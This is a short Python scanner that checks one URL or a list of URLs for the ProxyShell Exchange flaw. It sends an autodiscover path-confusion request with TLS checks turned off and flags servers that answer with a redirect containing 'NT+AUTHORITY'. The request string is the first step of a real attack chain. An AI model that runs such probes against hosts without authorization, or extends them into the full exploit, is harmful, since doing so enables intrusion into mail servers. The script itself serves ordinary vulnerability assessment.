import requests
import argparse
from termcolor import cprint

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

#url to check:
path = "autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com"

parser = argparse.ArgumentParser()

parser.add_argument("-u", "--url",
                    dest="url",
                    help="Check a single URL.",
                    action='store')
parser.add_argument("-l", "--list",
                    dest="usedlist",
                    help="Check a list of URLs.",
                    action='store')

args = parser.parse_args()

def main():
    urls = []
    if args.url:
        urls.append(args.url)
    if args.usedlist:
        with open(args.usedlist, "r") as f:
            for i in f.readlines():
                i = i.strip()
                if i == "" or i.startswith("#"):
                    continue
                urls.append(i)

    check_proxyshell(urls)

def check_proxyshell(urls):

        for url in urls:
                url = url + path
                cprint ("[+] checking: "+url,"yellow")
                try:
                        response = requests.get(url,verify=False,allow_redirects=False,timeout=5)
                        if response.status_code == 302 and "NT+AUTHORITY" in response.text:
                                cprint(url+" is vulnerable", "red")
                        else:
                                cprint(url+" is not vulnerable status code is: "+str(response.status_code),"green")
                except requests.exceptions.RequestException as e:
                        pass

main()
